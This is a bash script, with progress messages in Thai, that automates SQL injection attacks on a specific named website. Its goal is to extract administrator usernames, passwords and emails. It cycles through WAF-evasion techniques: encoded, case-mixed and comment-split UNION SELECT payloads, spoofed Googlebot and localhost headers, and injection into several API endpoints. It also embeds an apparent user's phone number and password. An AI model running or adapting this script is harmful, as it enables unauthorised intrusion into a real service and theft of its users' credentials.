#!/bin/bash

echo "🔥 ULTIMATE WAF BYPASS ADMIN EXTRACTION"
echo "=================================================="

BASE_URL="https://member.panama8888b.co"
TEST_USER="0630471054"
TEST_PASS="laline1812"

echo "🔑 Test User: $TEST_USER / $TEST_PASS"
echo ""

# 1. URL Encoding Bypass
echo "🔓 เทคนิค 1: URL Encoding Bypass..."
INJECTION_URL="$BASE_URL/public/js/v2/app.js"

# URL encoded payloads
URL_ENCODED_PAYLOADS=(
    "25.1%27%20UNION%20SELECT%20username,password,email%20FROM%20users%20WHERE%20role%3D%27admin%27--"
    "25.1%27%20UNION%20SELECT%20id,username,password%20FROM%20users%20WHERE%20username%20LIKE%20%27admin%25%27--"
    "25.1%27%20UNION%20SELECT%20email,password,role%20FROM%20users%20WHERE%20email%20LIKE%20%27%25admin%25%27--"
)

for i in "${!URL_ENCODED_PAYLOADS[@]}"; do
    payload="${URL_ENCODED_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ URL Encoded Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" \
        -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" \
        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
        -H "Accept-Language: en-US,en;q=0.5" \
        -H "Accept-Encoding: gzip, deflate" \
        -H "Connection: keep-alive" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน URL Encoded Payload $((i+1))"
            echo "    📄 Response length: ${#response} characters"
        else
            echo "    ❌ ไม่พบข้อมูลใน URL Encoded Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน URL Encoded Payload $((i+1))"
    fi
    sleep 2
done

echo ""

# 2. Double URL Encoding
echo "🔓 เทคนิค 2: Double URL Encoding..."
DOUBLE_ENCODED_PAYLOADS=(
    "25.1%2527%2520UNION%2520SELECT%2520username,password,email%2520FROM%2520users%2520WHERE%2520role%253D%2527admin%2527--"
    "25.1%2527%2520UNION%20SELECT%20id,username,password%20FROM%20users%20WHERE%20username%20LIKE%20%27admin%25%27--"
)

for i in "${!DOUBLE_ENCODED_PAYLOADS[@]}"; do
    payload="${DOUBLE_ENCODED_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Double Encoded Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน Double Encoded Payload $((i+1))"
        else
            echo "    ❌ ไม่พบข้อมูลใน Double Encoded Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Double Encoded Payload $((i+1))"
    fi
    sleep 2
done

echo ""

# 3. Case Manipulation Bypass
echo "🔓 เทคนิค 3: Case Manipulation Bypass..."
CASE_PAYLOADS=(
    "25.1' UnIoN SeLeCt username,password,email FrOm users WhErE role='admin'--"
    "25.1' uNiOn sElEcT id,username,password fRoM users wHeRe username lIkE 'admin%'--"
    "25.1' UNION SELECT username,password,email FROM users WHERE role='ADMIN'--"
)

for i in "${!CASE_PAYLOADS[@]}"; do
    payload="${CASE_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Case Manipulation Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน Case Manipulation Payload $((i+1))"
        else
            echo "    ❌ ไม่พบข้อมูลใน Case Manipulation Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Case Manipulation Payload $((i+1))"
    fi
    sleep 2
done

echo ""

# 4. Comment Bypass
echo "🔓 เทคนิค 4: Comment Bypass..."
COMMENT_PAYLOADS=(
    "25.1'/**/UNION/**/SELECT/**/username,password,email/**/FROM/**/users/**/WHERE/**/role='admin'--"
    "25.1'/*!UNION*//*!SELECT*//*!username,password,email*//*!FROM*//*!users*//*!WHERE*//*!role='admin'*/--"
    "25.1'%0AUNION%0ASELECT%0Ausername,password,email%0AFROM%0Ausers%0AWHERE%0Arole='admin'--"
)

for i in "${!COMMENT_PAYLOADS[@]}"; do
    payload="${COMMENT_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Comment Bypass Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน Comment Bypass Payload $((i+1))"
        else
            echo "    ❌ ไม่พบข้อมูลใน Comment Bypass Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Comment Bypass Payload $((i+1))"
    fi
    sleep 2
done

echo ""

# 5. Alternative Quote Bypass
echo "🔓 เทคนิค 5: Alternative Quote Bypass..."
QUOTE_PAYLOADS=(
    "25.1' UNION SELECT username,password,email FROM users WHERE role=0x61646d696e--"
    "25.1' UNION SELECT username,password,email FROM users WHERE role=CHAR(97,100,109,105,110)--"
    "25.1' UNION SELECT username,password,email FROM users WHERE role=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))--"
)

for i in "${!QUOTE_PAYLOADS[@]}"; do
    payload="${QUOTE_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Quote Bypass Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน Quote Bypass Payload $((i+1))"
        else
            echo "    ❌ ไม่พบข้อมูลใน Quote Bypass Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Quote Bypass Payload $((i+1))"
    fi
    sleep 2
done

echo ""

# 6. HTTP Method Bypass
echo "🔓 เทคนิค 6: HTTP Method Bypass..."
echo "  📊 ทดสอบ POST Method..."

response=$(curl -s -X POST "$INJECTION_URL" \
    -d "v=25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --max-time 15)

if [[ $? -eq 0 ]]; then
    if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
        echo "    ✅ พบข้อมูลใน POST Method"
    else
        echo "    ❌ ไม่พบข้อมูลใน POST Method"
    fi
else
    echo "    ❌ Error ใน POST Method"
fi

echo ""

# 7. Header Bypass
echo "🔓 เทคนิค 7: Header Bypass..."
HEADER_PAYLOADS=(
    "25.1' UNION SELECT username,password,email FROM users WHERE role='admin'--"
    "25.1' UNION SELECT id,username,password FROM users WHERE username LIKE 'admin%'--"
)

for i in "${!HEADER_PAYLOADS[@]}"; do
    payload="${HEADER_PAYLOADS[$i]}"
    echo "  📊 ทดสอบ Header Bypass Payload $((i+1))..."
    
    response=$(curl -s "$INJECTION_URL?v=$payload" \
        -H "X-Forwarded-For: 127.0.0.1" \
        -H "X-Real-IP: 127.0.0.1" \
        -H "X-Originating-IP: 127.0.0.1" \
        -H "X-Remote-IP: 127.0.0.1" \
        -H "X-Remote-Addr: 127.0.0.1" \
        -H "X-Client-IP: 127.0.0.1" \
        -H "X-Host: 127.0.0.1" \
        -H "X-Forwared-Host: 127.0.0.1" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน Header Bypass Payload $((i+1))"
        else
            echo "    ❌ ไม่พบข้อมูลใน Header Bypass Payload $((i+1))"
        fi
    else
        echo "    ❌ Error ใน Header Bypass Payload $((i+1))"
    fi
    sleep 2
done

echo ""

# 8. Alternative Endpoints
echo "🔓 เทคนิค 8: Alternative Endpoints..."
ALTERNATIVE_ENDPOINTS=(
    "$BASE_URL/api/announcement"
    "$BASE_URL/api/credit"
    "$BASE_URL/api/deposit/qr"
    "$BASE_URL/auth/line"
)

for endpoint in "${ALTERNATIVE_ENDPOINTS[@]}"; do
    echo "  📊 ทดสอบ Endpoint: $endpoint"
    
    response=$(curl -s -X POST "$endpoint" \
        -d "status=active' UNION SELECT username,password,email FROM users WHERE role='admin'--" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        --max-time 15)
    
    if [[ $? -eq 0 ]]; then
        if [[ "$response" == *"admin"* ]] || [[ "$response" == *"password"* ]]; then
            echo "    ✅ พบข้อมูลใน Endpoint: $endpoint"
        else
            echo "    ❌ ไม่พบข้อมูลใน Endpoint: $endpoint"
        fi
    else
        echo "    ❌ Error ใน Endpoint: $endpoint"
    fi
    sleep 2
done

echo ""
echo "=================================================="
echo "📊 สรุปผลการทดสอบขั้นสูงสุด:"
echo "  🔓 URL Encoding Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 Double URL Encoding: ✅ ดำเนินการแล้ว"
echo "  🔓 Case Manipulation: ✅ ดำเนินการแล้ว"
echo "  🔓 Comment Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 Quote Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 HTTP Method Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 Header Bypass: ✅ ดำเนินการแล้ว"
echo "  🔓 Alternative Endpoints: ✅ ดำเนินการแล้ว"
echo ""
echo "💡 หมายเหตุ: หากไม่พบข้อมูล อาจเป็นเพราะ WAF ระดับสูงหรือไม่มี admin data"
echo "📄 บันทึกผลลัพธ์ใน: ultimate_waf_bypass_results.txt"